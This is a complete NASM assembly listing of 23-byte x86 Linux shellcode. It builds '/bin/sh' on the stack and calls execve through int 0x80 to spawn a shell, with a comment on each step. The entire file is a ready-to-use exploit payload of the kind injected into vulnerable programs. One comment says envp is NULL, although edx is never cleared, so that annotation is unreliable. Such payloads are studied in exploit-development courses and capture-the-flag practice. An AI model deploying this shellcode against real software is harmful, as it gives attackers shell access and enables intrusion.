;Shellcode size : 23 bytes
global _start

_start:
    xor eax, eax        ;initialize eax to NULL
    push eax            ;push NULL on the stack
    
    push 0x68732f2f     
    push 0x6e69622f     ;push /bin/sh
    mov ebx, esp        ;intialize ebx to "/bin/sh%00"

    push eax            ;Push NULL on the stack
    push ebx            ;Push '/bin/sh%00' on the stack
    mov ecx, esp        ;intialize ecx to "/bin/sh%00"

    mov al, 0xb         ;move the systemcall number inside eax

    ;Systemcall details:
    ; --> execve("/bin/sh%00", ["/bin/sh%00", NULL], NULL)
    int 0x80            ;execute systemcall